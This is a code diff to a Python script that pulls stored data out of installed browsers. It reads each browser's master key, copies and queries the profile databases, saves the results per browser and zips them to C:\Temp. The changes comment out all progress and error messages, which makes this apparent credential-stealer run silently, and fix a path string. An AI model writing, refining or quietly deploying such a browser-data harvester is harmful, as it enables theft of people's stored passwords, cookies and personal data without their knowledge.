@@ -104,9 +104,9 @@ def save_results(browser_name, type_of_data, content):
         os.mkdir(browser_name)
     if content != "" and content != None:
         open(f'{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8").write(content)
-        print(f"\t [*] Saved in {browser_name}/{type_of_data}.txt")
-    else:
-        print(f"\t [-] No Data Found!")
+        # print(f"\t [*] Saved in {browser_name}/{type_of_data}.txt")
+    # else:
+        # print(f"\t [-] No Data Found!")
 
 
 def get_data(path: str, profile: str, key, type_of_data):
@@ -117,7 +117,7 @@ def get_data(path: str, profile: str, key, type_of_data):
     try:
         shutil.copy(db_file, 'temp_db')
     except:
-        print(f"Can't access file {type_of_data['file']}")
+        # print(f"Can't access file {type_of_data['file']}")
         return result
     conn = sqlite3.connect('temp_db')
     cursor = conn.cursor()
@@ -166,16 +166,16 @@ if __name__ == '__main__':
     for browser in available_browsers:
         browser_path = browsers[browser]
         master_key = get_master_key(browser_path)
-        print(f"Getting Stored Details from {browser}")
+        # print(f"Getting Stored Details from {browser}")
 
         for data_type_name, data_type in data_queries.items():
-            print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
+            # print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
             notdefault = ['opera-gx'] # Browsers that we do not specify "Default" for profile
             profile = "Default"
             if browser in notdefault:
                 profile = ""
             data = get_data(browser_path, profile, master_key, data_type)
             save_results(browser, data_type_name, data)
-            print("\t------\n")
+            # print("\t------\n")
     print(f"Saving result in zip file.")
-    zip_multiple_directories(available_browsers, 'C:\Temp\\result.zip')
+    zip_multiple_directories(available_browsers, 'C:\\Temp\\result.zip')
